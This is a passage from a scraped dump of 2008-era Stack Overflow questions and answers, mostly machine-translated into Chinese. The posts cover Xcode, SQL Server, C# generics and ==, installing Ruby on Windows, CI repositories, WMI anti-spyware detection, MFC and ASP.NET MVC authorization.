我可能从一开始就应该更清楚，但我找到了我要找的东西：

[http://wiki.wxpython.org/ModelViewController/](http://wiki.wxpython.org/ModelViewController/)

在 wxpython wiki 中，我发现了几个简单、具体的 MVC 项目示例。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-24T06:24:15.050

在适当的 OOP 设计中，这将是独立的或文件系统类的一部分 - 它不会是应用程序或框架的一部分。

# xcode - 从双显示器切换到单显示器时的 Xcode 窗口位置

> ID：390884
> 
> 赞同：1
> 
> 时间：2008-12-24T06:23:04.663
> 
> 标签：xcode, macos, multiple-monitors

当我在家工作时，我将 MacBook 插入 20 英寸显示器作为第二个（右侧）显示器。我在更大的显示器上使用 Xcode 进行所有编辑，并将菜单栏、调试和文档留在笔记本电脑的监视器。

问题是当我与第二台显示器断开连接并想在“笔记本电脑”模式下处理代码时。现在，每当我打开一个文件进行编辑时，它几乎完全显示在屏幕之外，我必须将它拖过来进行编辑。我理解（某种程度上）为什么会发生这种情况，因为我上次在不同的显示器上打开它。我想做的是重置 Xcode 中的窗口位置，以便编辑窗口完全显示在笔记本电脑显示器上。关于如何做到这一点的任何想法？

我什至愿意从偏好中删除条目（或设置一个applescript来做到这一点），但xcode plist对我来说是不可思议的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T07:27:00.510

在finder中右键项目，选择show package contents，删除两个username.*文件。它不是自动化的......但它可以工作。

此外，如果您使用某种版本控制系统，您可能希望将 username.* 添加到您的忽略模式中。

# sql-server - SQL Server 中的函数和过程

> ID：390889
> 
> 赞同：0
> 
> 时间：2008-12-24T06:25:16.657
> 
> 标签：sql-server

SQL Server 中的函数和过程有什么区别？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T06:53:40.187

您可以在 SQL 语句中嵌入函数，就像在 COALESCE、CONVERT 等任何原生 SQL 函数中一样。Procs 可以返回一个值，但返回的值是有限的。例如，如果我没记错的话，您可以从函数返回表变量，但不能返回存储过程。

**因此，使用函数，您可以执行以下操作：**

```
SELECT dbo.MyFunc(myColumn) as [Column Alias Name] FROM MyTable 
```

或者

```
SELECT * FROM dbo.MyTableVariableReturningFunc() as tbl 
```

**使用存储过程，您可以像这样获得返回值：**

```
DELCARE @ReturnVal as int

EXEC @ReturnVal = USP_MyStoredProc 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-24T10:28:06.433

另一个区别是用户定义的函数不能修改数据库数据，而过程可以。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-24T11:21:13.360

从逻辑上讲，对我来说，一个函数将用于在任何查询中跨整个数据库执行*常见任务。*另一方面，存储过程将是我用来执行定期完成的复杂任务的东西，但并不常见。例如，我通常编写的存储过程将从文件中获取数据并上传到表中（同时在过程中执行许多其他操作，例如审计等）。它不会在其他任何地方使用，但我会每天运行一次。

# c# - 如何调试参数化 SQL 查询

> ID：390891
> 
> 赞同：5
> 
> 时间：2008-12-24T06:26:40.193
> 
> 标签：c#, sql

我使用 C# 连接到数据库，然后使用 Ad hoc SQL 来获取数据。这个简单的 SQL 查询调试起来非常方便，因为我可以记录 SQL 查询字符串。如果我使用参数化的 SQL 查询命令，有没有办法记录 sql 查询字符串以进行调试？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-12-10T09:20:00.720

我想这就是它。将此代码放置在您配置查询命令的位置，您将进入`debugSQL`将执行的 SQL 语句

```
string debugSQL = cmd.CommandText;

foreach (SqlParameter param in cmd.Parameters)
{
    debugSQL = debugSQL.Replace(param.ParameterName, param.Value.ToString());
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2018-01-17T08:43:55.313

**SQL 服务器**

对于 SQL Server，您可以使用 SQL Server Profiler：

[![SQL 探查器](https://i.stack.imgur.com/4Nbil.jpg)](https://i.stack.imgur.com/4Nbil.jpg)

启动一个新的跟踪会话，您将看到执行的所有内容。你也可以过滤它。

[![痕迹](https://i.stack.imgur.com/b9wTi.jpg)](https://i.stack.imgur.com/b9wTi.jpg)

更多信息[在这里](https://docs.microsoft.com/en-us/sql/tools/sql-server-profiler/create-a-trace-sql-server-profiler)。

**其他一切**

一般，您正在寻找查询分析器。您可以搜索`<RDBMS NAME> query profiler`并且应该找到有用的东西。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-24T10:02:31.600

使用库的“调试”标志通常是最简单的解决方案。但是您依赖于可以欺骗您的库，或者至少隐藏了它会做的一些事情（例如，psycopg 默默地更改默认隔离级别）。

在 DBMS 方面，您始终可以激活日志记录。它的好处是，无论您的客户端库做什么，您都将获得准确的 SQL 请求。在这方面，它比库的“调试”标志更好。但是，在某些 DBMS 上，日志记录语句可能非常慢（PostgreSQL 就是这种情况）。

如果您有足够的权限，另一种解决方案是在网络上使用嗅探器。[Wireshark](http://www.wireshark.org/)可以解码许多 DBMS 的协议并呈现实际的 SQL 请求。

在[PostgreSQL](http://www.postgresql.org/)上，通过以下方式激活日志记录`postgresql.conf`：

```
log_statement = 'all'                   # none, ddl, mod, all 
```

我通常也使用：

```
log_connections = on
log_disconnections = on
log_duration = on
log_hostname = on 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2018-01-24T01:04:14.160

equisde 的回答很有帮助，但要处理 bool 和 char 类型，我需要这种变体：

```
string debugSQL = dbCommand.CommandText;
foreach (SqlParameter param in dbCommand.Parameters)
{
    string val = param.Value.ToString();
    switch (param.DbType)
    {
        case System.Data.DbType.AnsiString:
                val = "'" + val + "'";
            break;
        case System.Data.DbType.Boolean:
            val = (val == "True" ? "1" : "0");
            break;
    }
    debugSQL = debugSQL.Replace("@" + param.ParameterName, val);
} 
```

# continuous-integration - 存储库应该包含什么？

> ID：390895
> 
> 赞同：0
> 
> 时间：2008-12-24T06:29:13.077
> 
> 标签：continuous-integration

我正在尝试建立一个持续集成过程。对于我的各种构建任务（编译、测试、文档等），我需要有执行这些任务的工具（csc、NUnit、NDoc 等）。我的问题是这些工具也应该进入我的源代码控制存储库吗？

为什么我认为他们应该是因为我在一些在线文章中读到开发人员环境应该与构建服务器环境非常相似。为了满足这个要求，文章建议您将构建所需的所有内容都放在存储库中，当您签出代码（或构建服务器签出代码）时，您无需先安装即可立即构建项目任何其他工具。但另一方面，如果我将这些工具与我的源代码一起放在存储库中，那么构建服务器将不得不在构建运行时安装它们。

安装这些工具可以吗？它不会不必要地增加每次构建的时间吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T06:33:21.507

除非您正在自定义工具，否则可能没有理由将它们的源代码放在您的存储库中。但是，将配置文件放入存储库中是有充分理由的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-12-24T07:28:43.797

尝试签入工具以进行源代码控制通常比值得尝试的麻烦更多。相反，编写一个软件需求列表，在检出和构建源代码之前必须安装这些需求（无论如何，需要在此列表中的一件事是源代码控制系统本身）。如果您依赖源代码控制中的软件，则可能需要将某些工具安装在某些路径中或进行其他配置（想到注册表项）。

我当然*不会*将编译器本身签入源代码控制，我也可能不会签入 NUnit 或 NDoc。只需预先安装这些，因为它们在项目的整个生命周期中不太可能发生太大变化。您的构建脚本可能希望在构建继续之前检查所需软件包的预期版本是否已安装。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-24T10:16:25.893

为每个构建重新安装工具是多余的，并且会减慢您的速度。

然而，最好有一个**专门用于持续集成的服务器，**这样你就可以知道它的状态；您确定没有人安装任何可能对构建结果产生影响的东西。

如果您希望能够在明年重新生成今天的构建，您需要能够首先重新创建您的环境。确保您能够重新安装您的工具（完全相同的版本），或者将它们保留在您的服务器上（将较新版本安装在不同的目录中），或者将整个包存储在您的配置管理工具中。

想想你将如何创建另一个持续集成服务器，或者拥有两个，或者用于第二个站点，或者在灾难后恢复。**记录如何设置持续集成服务器**。

**真正需要版本控制**的是构建脚本，它可以访问正确版本的工具，特别是如果您选择安装多个版本的工具。

# windows - 手动安装 Ruby 1.8.7（和其他东西）

> ID：390897
> 
> 赞同：15
> 
> 时间：2008-12-24T06:29:34.680
> 
> 标签：windows, ruby, installation

我不想再依赖一键安装程序了，我想学习如何手动安装 Ruby。有这方面的资源吗？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-01-05T16:56:12.603

1.  在此处下载 Ruby 1.8.7 的 Windows 二进制文件：[http](http://www.ruby-lang.org/en/downloads/) ://www.ruby-lang.org/en/downloads/ 。将其提取到您想要的任何位置；我用`C:\ruby`. 然后放入`C:\ruby\bin`您的 PATH 环境变量。
2.  下载 zlib 包：[http](http://www.zlib.net/zlib123-dll.zip) : //www.zlib.net/zlib123-dll.zip 并解压 zlib1.dll，将其重命名为 zlib.dll 并将其移动到您的 Windows\System32 中。
3.  下载 iconv 包： http: [//sourceforge.net/project/showfiles.php](http://sourceforge.net/project/showfiles.php?group_id=25167&package_id=51458) ?group_id=25167&package_id=51458 。找到 iconv.dll 文件并将其解压缩到您的 Windows\System32 中。
4.  下载 ruby​​gems 包并按照说明进行操作，基本上是解压包并运行 ruby`setup.rb`​​ 。
5.  通过尝试验证一切正常`gem install rails`，一旦安装，然后执行：`rails test_project`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-24T06:32:41.510

好吧，如果您使用的是 Mac，我会推荐[MacPorts](http://en.wikipedia.org/wiki/MacPorts)。[这里](http://paulsturgess.co.uk/articles/show/46-using-macportsdarwinports-to-install-ruby-on-rails-mysql-subversion-capistrano-and-mongrel-on-mac-os-x)有一个很好的帖子，它仍然有效。

如果您在 Windows 上并且不想使用[一键式安装程序](http://www.ruby-lang.org/en/downloads/)，您可以安装[Cygwin](http://en.wikipedia.org/wiki/Cygwin)并通过它构建 ruby​​。这是我找到[的一个帖子。](http://www.sugihara.com/ruby/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2008-12-24T09:51:51.870

我将从一键式安装程序开始，可能是通过仔细查看[RubyForge 上的源代码](http://rubyforge.org/scm/?group_id=167)（免责声明，我实际上并没有这样做......）。这些人清楚地知道如何在 Windows 上从源代码构建 Ruby，所以我倾向于看看他们是如何做到的。

除此之外，您知道您可以从[ruby​​-lang.org 下载页面下载](http://www.ruby-lang.org/en/downloads/)[1.8.7 Windows 二进制](ftp://ftp.ruby-lang.org/pub/ruby/binaries/mswin32/ruby-1.8.7-i386-mswin32.zip)文件吗？该页面也有当前稳定的[1.8.7 源](ftp://ftp.ruby-lang.org/pub/ruby/1.8/ruby-1.8.7-p72.tar.gz)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-14T01:35:09.077

您可能还需要在 OpenSSL 中找到的 libeay32.dll 和 ssleay32.dll：[http ://www.slproweb.com/products/Win32OpenSSL.html](http://www.slproweb.com/products/Win32OpenSSL.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-06-13T17:33:22.800

我几乎已经得出结论，Ruby 1.8.7 在 Windows 上还不稳定。按照上面的说明，我能够让它在一台 Vista 机器上运行，但不是我的笔记本电脑。

对于笔记本电脑，我遵循以下步骤，到目前为止一切似乎都在工作：

*   使用一键式安装程序安装 1.8.6。如有必要，让它删除旧的 Ruby 副本。
*   安装宝石 1.3.4
*   宝石安装导轨
*   红宝石脚本\控制台
*   将浏览器指向[http://localhost:3000/](http://localhost:3000/)。确保一切按预期工作
*   停止控制台
*   将 1.8.7 zip 文件解压到 Ruby 1.8.6 目录中
*   将上面讨论的 dll 文件复制到 ruby​​/bin 目录中
*   重新启动控制台并再次检查[http://localhost:3000/](http://localhost:3000/)

如果上述说明不起作用，我只会按照这些指示作为最后的手段。

在你对我摇手指并责骂我这种做法之前......

请考虑我花了大约 8 个小时阅读并尝试了所有可能的方法，并且能够在另一台计算机上成功使用上述方法。我愿意接受其他建议！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-10-28T20:22:32.717

如果您正在寻找获取所有这些 DLL 文件的地方 - 这里有一个技巧：如果您为 Ruby 1.8.6 安装 Ruby 一键式安装程序，它包含所有这些 DLL 文件`C:\ruby1.8.6\bin`（假设您在那里安装了它） .

我正在使用 PIK gem（适用于 Windows 的 rvm）并在 Ruby 1.9.1 中遇到了这个问题，并且在复制了这些 DLL 文件后一切正常。

Of course, those DLL files are somewhat old, so if Ruby 1.9.1 or 1.8.7 relies on any new features in those DLL files there might be a potential for a bug, but I haven't noticed anything so far and it beats hunting down them on the Internet.

# c# - 运算符 == 不能应用于 C# 中的泛型类型吗？

> ID：390900
> 
> 赞同：372
> 
> 时间：2008-12-24T06:32:28.187
> 
> 标签：c#, generics, operators, equals-operator

根据[MSDN](http://msdn.microsoft.com/en-us/library/53k8ybth.aspx)`==`中运营商的文档，

> 对于预定义的值类型，相等运算符 (==) 如果其操作数的值相等则返回 true，否则返回 false。对于字符串以外的引用类型，== 如果它的两个操作数引用同一个对象，则返回 true。对于字符串类型，== 比较字符串的值。用户定义的值类型可以重载 == 运算符（请参阅运算符）。用户定义的引用类型也可以，尽管 **默认情况下 == 对于预定义的和用户定义的引用类型的行为如上所述。**

那么为什么这个代码片段无法编译呢？

```
bool Compare<T>(T x, T y) { return x == y; } 
```

我收到错误*Operator '==' cannot be applied to operands of type 'T' and 'T'*。我想知道为什么，因为据我所知，`==`运算符是为所有类型预定义的？

**编辑：**谢谢大家。起初我没有注意到该声明仅涉及引用类型。我还认为为所有值类型提供了逐位比较，我现在知道这是*不*正确的。

但是，如果我使用引用类型，`==`运算符会使用预定义的引用比较，还是如果类型定义了运算符，它会使用运算符的重载版本？

**编辑 2：**通过反复试验，我们了解到`==`运算符在使用不受限制的泛型类型时将使用预定义的引用比较。实际上，编译器将使用它可以找到的最佳方法来处理受限类型参数，但不会再看下去了。例如，下面的代码将始终打印`true`，即使`Test.test<B>(new B(), new B())`被调用：

```
class A { public static bool operator==(A x, A y) { return true; } }
class B : A { public static bool operator==(B x, B y) { return false; } }
class Test { void test<T>(T a, T b) where T : A { Console.WriteLine(a == b); } } 
```

* * *

## 回答 #1

> 赞同：329
> 
> 时间：2008-12-24T07:32:38.407

As others have said, it will only work when T is constrained to be a reference type. Without any constraints, you can compare with null, but only null - and that comparison will always be false for non-nullable value types.

Instead of calling Equals, it's better to use an `IComparer<T>` - and if you have no more information, `EqualityComparer<T>.Default` is a good choice:

```
public bool Compare<T>(T x, T y)
{
    return EqualityComparer<T>.Default.Equals(x, y);
} 
```

Aside from anything else, this avoids boxing/casting.

* * *

## 回答 #2

> 赞同：152
> 
> 时间：2008-12-24T06:44:55.227

"...by default == behaves as described above for both predefined and user-defined reference types."

Type T is not necessarily a reference type, so the compiler can't make that assumption.

However, this will compile because it is more explicit:

```
 bool Compare<T>(T x, T y) where T : class
    {
        return x == y;
    } 
```

**Follow up to additional question, "But, in case I'm using a reference type, would the the == operator use the predefined reference comparison, or would it use the overloaded version of the operator if a type defined one?"**

I would have thought that == on the Generics would use the overloaded version, but the following test demonstrates otherwise. Interesting... I'd love to know why! If someone knows please share.

```
namespace TestProject
{
 class Program
 {
    static void Main(string[] args)
    {
        Test a = new Test();
        Test b = new Test();

        Console.WriteLine("Inline:");
        bool x = a == b;
        Console.WriteLine("Generic:");
        Compare<Test>(a, b);

    }

    static bool Compare<T>(T x, T y) where T : class
    {
        return x == y;
    }
 }

 class Test
 {
    public static bool operator ==(Test a, Test b)
    {
        Console.WriteLine("Overloaded == called");
        return a.Equals(b);
    }

    public static bool operator !=(Test a, Test b)
    {
        Console.WriteLine("Overloaded != called");
        return a.Equals(b);
    }
  }
} 
```

**Output**

Inline: Overloaded == called

Generic:

Press any key to continue . . .

**Follow Up 2**

I do want to point out that changing my compare method to

```
 static bool Compare<T>(T x, T y) where T : Test
    {
        return x == y;
    } 
```

causes the overloaded == operator to be called. I guess without specifying the type (as a *where*), the compiler can't infer that it should use the overloaded operator... though I'd think that it would have enough information to make that decision even without specifying the type.

* * *

## 回答 #3

> 赞同：45
> 
> 时间：2008-12-24T10:18:15.907

In general, `EqualityComparer<T>.Default.Equals` should do the job with anything that implements `IEquatable<T>`, or that has a sensible `Equals` implementation.

If, however, `==` and `Equals` are implemented differently for some reason, then my work on [generic operators](http://www.pobox.com/~skeet/csharp/miscutil/usage/genericoperators.html) should be useful; it supports the **operator** versions of (among others):

*   Equal(T value1, T value2)
*   NotEqual(T value1, T value2)
*   GreaterThan(T value1, T value2)
*   LessThan(T value1, T value2)
*   GreaterThanOrEqual(T value1, T value2)
*   LessThanOrEqual(T value1, T value2)

* * *

## 回答 #4

> 赞同：37
> 
> 时间：2010-12-12T20:38:04.250

So many answers, and not a single one explains the WHY? (which Giovanni explicitly asked)...

.NET generics do not act like C++ templates. In C++ templates, overload resolution occurs after the actual template parameters are known.

In .NET generics (including C#), overload resolution occurs without knowing the actual generic parameters. The only information the compiler can use to choose the function to call comes from type constraints on the generic parameters.

* * *

## 回答 #5

> 赞同：13
> 
> 时间：2008-12-24T06:42:44.140

编译不能知道 T 不能是结构（值类型）。所以你必须告诉它它只能是我认为的参考类型：

```
bool Compare<T>(T x, T y) where T : class { return x == y; } 
```

这是因为如果 T 可以是值类型，则可能`x == y`会出现格式错误的情况 - 在类型没有定义运算符 == 的情况下。同样的情况也会发生，这更明显：

```
void CallFoo<T>(T x) { x.foo(); } 
```

That fails too, because you could pass a type T that wouldn't have a function foo. C# forces you to make sure all possible types always have a function foo. That's done by the where clause.

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2008-12-24T06:58:03.343

It appears that without the class constraint:

```
bool Compare<T> (T x, T y) where T: class
{
    return x == y;
} 
```

One should realize that while `class` constrained `Equals` in the `==` operator inherits from `Object.Equals`, while that of a struct overrides `ValueType.Equals`.

Note that:

```
bool Compare<T> (T x, T y) where T: struct
{
    return x == y;
} 
```

also gives out the same compiler error.

As yet I do not understand why having a value type equality operator comparison is rejected by the compiler. I do know for a fact though, that this works:

```
bool Compare<T> (T x, T y)
{
    return x.Equals(y);
} 
```

* * *

## 回答 #7

> 赞同：6
> 
> 时间：2016-09-03T09:39:35.763

Well in my case I wanted to unit-test the equality operator. I needed call the code under the equality operators without explicitly setting the generic type. Advises for `EqualityComparer` were not helpful as `EqualityComparer` called `Equals` method but not the equality operator.

Here is how I've got this working with generic types by building a `LINQ`. It calls the right code for `==` and `!=` operators:

```
/// <summary>
/// Gets the result of "a == b"
/// </summary>
public bool GetEqualityOperatorResult<T>(T a, T b)
{
    // declare the parameters
    var paramA = Expression.Parameter(typeof(T), nameof(a));
    var paramB = Expression.Parameter(typeof(T), nameof(b));
    // get equality expression for the parameters
    var body = Expression.Equal(paramA, paramB);
    // compile it
    var invokeEqualityOperator = Expression.Lambda<Func<T, T, bool>>(body, paramA, paramB).Compile();
    // call it
    return invokeEqualityOperator(a, b);
}

/// <summary>
/// Gets the result of "a =! b"
/// </summary>
public bool GetInequalityOperatorResult<T>(T a, T b)
{
    // declare the parameters
    var paramA = Expression.Parameter(typeof(T), nameof(a));
    var paramB = Expression.Parameter(typeof(T), nameof(b));
    // get equality expression for the parameters
    var body = Expression.NotEqual(paramA, paramB);
    // compile it
    var invokeInequalityOperator = Expression.Lambda<Func<T, T, bool>>(body, paramA, paramB).Compile();
    // call it
    return invokeInequalityOperator(a, b);
} 
```

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2009-08-19T15:51:59.693

There is an MSDN Connect entry for this [here](http://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=304501)

Alex Turner's reply starts with:

> Unfortunately, this behavior is by design and there is not an easy solution to enable use of == with type parameters that may contain value types.

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2011-02-18T14:25:36.787

If you want to make sure the operators of your custom type are called you can do so via reflection. Just get the type using your generic parameter and retrieve the MethodInfo for the desired operator (e.g. op_Equality, op_Inequality, op_LessThan...).

```
var methodInfo = typeof (T).GetMethod("op_Equality", 
                             BindingFlags.Static | BindingFlags.Public); 
```

Then execute the operator using the MethodInfo's Invoke method and pass in the objects as the parameters.

```
var result = (bool) methodInfo.Invoke(null, new object[] { object1, object2}); 
```

This will invoke your overloaded operator and not the one defined by the constraints applied on the generic parameter. Might not be practical, but could come in handy for unit testing your operators when using a generic base class that contains a couple of tests.

* * *

## 回答 #10

> 赞同：2
> 
> 时间：2013-06-20T02:03:45.813

I wrote the following function looking at the latest msdn. It can easily compare two objects `x` and `y`:

```
static bool IsLessThan(T x, T y) 
{
    return ((IComparable)(x)).CompareTo(y) <= 0;
} 
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-12-24T06:43:28.383

```
 bool Compare(T x, T y) where T : class { return x == y; } 

```

The above will work because == is taken care of in case of user-defined reference types.
In case of value types, == can be overridden. In which case, "!=" should also be defined.

I think that could be the reason, it disallows generic comparison using "==".

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2019-10-18T06:16:52.023

The `.Equals()` works for me while `TKey` is a generic type.

```
public virtual TOutputDto GetOne(TKey id)
{
    var entity =
        _unitOfWork.BaseRepository
            .FindByCondition(x => 
                !x.IsDelete && 
                x.Id.Equals(id))
            .SingleOrDefault();

    // ...
} 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2021-08-20T11:10:15.697

I have 2 solutions and they're very simply.

Solution 1: Cast the generic typed variable to `object` and use `==` operator.

Example:

```
void Foo<T>(T t1, T t2)
{
   object o1 = t1;
   object o2 = t2;
   if (o1 == o2)
   {
      // ...
      // ..
      // . 
   }
} 
```

Solution 2: Use `object.Equals(object, object)` method.

Example:

```
void Foo<T>(T t1, T t2)
{
   if (object.Equals(t1, t2)
   {
       // ...
       // ..
       // .
   }
} 
```

# security - 如何使用 WMI 在 XP 上检测已安装的反间谍软件应用程序

> ID：390908
> 
> 赞同：0
> 
> 时间：2008-12-24T06:37:44.353
> 
> 标签：security, spyware

我需要获取有关使用 WMI 安装在客户端计算机上的间谍软件的信息吗？这可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-01-04T13:46:57.010

我在丹麦网站[Udvikleren.dk](http://www.udvikleren.dk/Delphi/Thread.aspx/2/27165/)上找到了这个代码示例，希望它对你有用。也可用于通过将“AntiSpywareProduct”替换为“AntiVirusProduct”来查找防病毒软件。

```
uses Windows, WbemScripting_TLB, ActiveX, ComObj;

var
Locator:ISWbemLocator;
Services:ISWbemServices;
ResultSet:ISWbemObjectSet;
Enum :IEnumVariant;
Item :OleVariant;
Value:LongWord;
begin
CoInitializeEx(nil, 0);

CoInitializeSecurity(nil, -1, nil, nil, 0, 3, nil, 0, 0);

Locator:=CoSWbemLocator.Create as ISWbemLocator;
Services:=Locator.ConnectServer('.', 'root\SecurityCenter', '', '', '', '', 0, nil);
ResultSet:=Services.ExecQuery('SELECT * FROM AntiSpywareProduct', 'WQL', wbemFlagReturnImmediately or wbemFlagBidirectional,nil);
Enum:=ResultSet._NewEnum as IEnumVariant;

enum.Reset;

while Enum.Next(1,item,value) = S_OK do
  writeln(Item.displayName, '. Enabled: ',Item.productEnabled);
end; 
```

# c# - 在 Excel 自动化中，如何优雅地处理文件打开时出现的无效文件格式错误？

> ID：390920
> 
> 赞同：0
> 
> 时间：2008-12-24T06:44:58.300
> 
> 标签：c#, excel, officedev

我正在尝试使用“excelApp.Workbooks.Open()”方法在 C# 程序中打开 Microsoft Excel 文件。碰巧的是，如果文件的格式无效，此方法会导致显示错误消息框。但是，我不希望那样；我希望在我自己的代码中优雅地处理这个错误。

我的问题是，我该怎么做？

上面的方法不会抛出任何我可以捕捉到的异常。即使确实如此，仍然有那个讨厌的消息框。因此，也许唯一的方法是在打开文件*之前*验证文件格式。那么，Excel API 中是否有另一种方法可以进行此类验证？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-24T06:54:36.380

抱歉，我无法使用 Excel 2007 模拟损坏的 xls 文件示例。

在调用 Workbooks.Open... 之前尝试 Application.DisplayAlerts = False

如果无法打开工作簿，则返回值为 null。
（即 Workbook wkb = Workbooks.Open(....); 当 DisplayAlerts = False 并且文件无法打开时，wkb 将为空）

这纯粹是基于我对excel对象模型的理解。

# unit-testing - 测试数据访问持久化方法

> ID：390921
> 
> 赞同：2
> 
> 时间：2008-12-24T06:46:57.330
> 
> 标签：unit-testing, tdd, data-access-layer

只是想知道是否有人对如何测试数据访问方法有任何想法。我发现测试检索数据访问方法要容易得多，因为我可以模拟出`ExecuteReader`并返回一个填充的`dataTable.CreateDataReader()`. 通过这样做，我可以测试如果返回结果集，我的对象是否正确填充。

但是我如何将其转换为我的持久方法（即添加、更新、删除等）。我要测试的是它是否正确填充命令参数等。

有任何想法吗？干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-24T06:52:59.610

嘲笑是要走的路。[使用Moq](http://code.google.com/p/moq/)之类的东西，您可以为数据访问类提供模拟连接（例如 IDbConnection），并测试连接创建的命令是否正确设置了参数。

不久前我写了一篇博文（参见[此处](http://www.madprops.org/blog/moq-triqs-successive-expectations/)），其中描述了一种模拟对 IDbCommand.CreateParameter 的连续调用的方法。设置模拟参数后，您可以验证它们的 Value 和 ParameterName 属性是否已设置。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-24T07:09:55.083

我们使用内存数据库（hsql）进行单元测试。设置启动事务，而拆解将其回滚。然后你总是知道单元测试中数据库的状态。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-24T08:42:43.790

对于我们的 o/r 映射器框架 LLBLGen Pro，我们使用专门的数据库进行测试，并为每组功能使用不同的测试项目。所以我们有一个用于插入/更新的特殊数据库，例如一个用于测试继承相关操作的特殊数据库、一个用于大集合的特殊数据库、一个用于获取的特殊数据库。最重要的是，我们在不同的项目中分离了单元测试：面向获取、面向 linq 提供者、面向插入/更新/删除、面向内存中的东西等。

这样，测试是可维护的并且不会相互影响。借助特殊的数据库，我们知道会发生什么以及该做什么。

当然，这还取决于您对持久性逻辑测试的含义：如果您想像我们一样测试框架级例程，那么模拟实际上并没有那么有用：您想在涵盖的场景中测试真正的交易大多数（如果不是全部）案例。如果您真的在谈论使用框架级代码（例如您的存储库代码）测试您的代码，那么模拟可以提供帮助，只要使用的框架当然没有错误。:)

# mfc - 在窗口的最小化或最大化过程中处理了什么消息？

> ID：390923
> 
> 赞同：4
> 
> 时间：2008-12-24T06:49:52.003
> 
> 标签：mfc, onncpaint

我想用 MFC 自己画一个窗口的标题栏。所以我重写了 CMainFrame 的 OnNcPaint() 方法。一切似乎都很好，直到我单击控制菜单中的项目以使其最小化或最大化。在最小化或最大化过程中，我可以看到原来的标题栏出现了。我不知道为什么会这样。也许在这个过程中有一些我没有处理的消息？需要你的帮助。非常感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-24T14:52:04.807

*在*最小化/最大化过程中？听起来像最小/最大动画。您可以通过“我的电脑”>“属性”>“高级”>（性能）设置禁用动画来验证这一点。

至于标题问题，你会得到 WM_SIZE。查看[CWnd::OnSize](http://msdn.microsoft.com/en-us/library/h464d4f3(VS.80).aspx)的文档。

```
CMyDialog::OnSize(UINT nType, int cx, int cy)
{
    switch (nType)
    {
        case SIZE_MAXIMIZED:
            // window was maximized
            break;

        case SIZE_MINIMIZED:
            // window was minimized
            break;

        case SIZE_RESTORED:
            // misleading - this occurs when restored from minimized/maximized AND
            // for normal size operations when already restored
            break;

        default:
            // you could also deal with SIZE_MAXHIDE and SIZE_MAXSHOW
            // but rarely need to
            break;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-24T06:57:31.880

您可以使用 Spy++ 查看窗口收到的消息。我对 OnSize 的模糊记忆比我预期的一些消息来得早。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-04T19:59:22.347

你说的是窗口动画，对吧？窗口从其当前大小和位置显示为“增长”或“缩小”到最大化大小或任务栏的位置。

该动画的执行独立于窗口的外观。您可以调用[`DrawAnimatedRects`API 函数](http://msdn.microsoft.com/en-us/library/ms534887.aspx)自行触发动画。它只是根据当前的显示设置绘制一个普通的标题栏。

请注意，具有自定义绘制标题栏的其他窗口的行为方式相同。例如，查看各种版本的 Office。在最小化或最大化时，绘制的是 Windows 标题栏，而不是客户标题栏。在调整不会占用全屏的窗口大小时，您还可以看到异常。例如，当最大化 Hearts 游戏时，动画显示窗口扩大到屏幕的整个宽度，但当动画结束时，窗口变窄（但仍然最大化）。

因此，为了回答您的问题，**不发送任何消息**。调整大小动画由窗口管理器执行，无需任何帮助或参与调整大小的窗口。就您的程序而言，窗口直接从其原始大小变为新大小。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-28T00:47:31.653

之前调用过 OnShow。OnSize 是在之后调用的。
我认为这些值是`SW_MAXIMIZE`和`SW_MINIMIZE`..

还有一种方法可以使您的应用程序不关心窗口中的动画设置。
有一篇关于在最小化时将您的应用程序添加到系统托盘的文章，它惊人地覆盖了绘图。自从我使用它已经有好几年了，但如果你能找到它，你会是金色的。

# asp.net-mvc - 使用角色的asp.net mvc授权

> ID：390930
> 
> 赞同：24
> 
> 时间：2008-12-24T06:54:38.843
> 
> 标签：asp.net-mvc, authorization

我正在创建一个具有用户概念的 asp.net mvc 应用程序。每个用户都可以编辑自己的个人资料。例如：

*   PersonID=1 可以通过访问[http://localhost/person/edit/1来编辑他们的个人资料](http://localhost/person/edit/1)
*   PersonID=2 可以通过访问[http://localhost/person/edit/2来编辑他们的个人资料](http://localhost/person/edit/2)

那里没有什么特别令人兴奋的...

但是，我在授权方案上遇到了一些麻烦。目前系统中只有两个角色，“管理员”和“默认用户”，但未来可能会更多。

我不能使用常规的 Authorize 属性来指定授权，因为两个用户都处于相同的角色（即“DefaultUser”）。

所以，如果我像这样指定授权过滤器：

```
[Authorize(Roles = "DefaultUser")] 
```

